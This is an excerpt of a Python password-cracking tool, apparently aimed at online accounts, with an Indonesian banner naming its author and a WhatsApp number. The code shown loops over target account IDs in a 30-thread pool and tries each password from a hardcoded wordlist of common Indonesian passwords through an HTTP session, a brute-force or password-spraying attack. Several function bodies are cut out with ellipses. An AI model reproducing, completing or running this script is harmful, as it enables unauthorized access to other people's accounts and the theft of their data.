...
def banner():
	clear()
	wel = '# TOOLS CRACK CROT XD'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	au='_________________  _________  ____  __. |\n\____    /\      \ \_   ___ \|    |/ _| |[•]AUTHOR : ILHAM\n  /     / /   |   \/    \  \/|      <   | [•]WHATSAPP : 082370472429\n /     /_/    |    \     \___|    |  \  | [•]HOBI : NGOCOK\n/_______ \____|__  /\______  /____|__ \ |[•]SCRIP : PREMIUM\n        \/       \/        \/        \/ |'
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123','rahasia','cantikuh','ganteng','kontoll','kontol','bismillah','rahasia','pantek','bujang','indonesia']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	ses = requests.Session()
	print('\r [%s❨HAMM❩\33[m] %s/%s 😎 \x1b[1;96mSEDANG:[%s] 😎 \x1b[1;96mCRACK:[%s] %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	for pw in pwv:
		try:
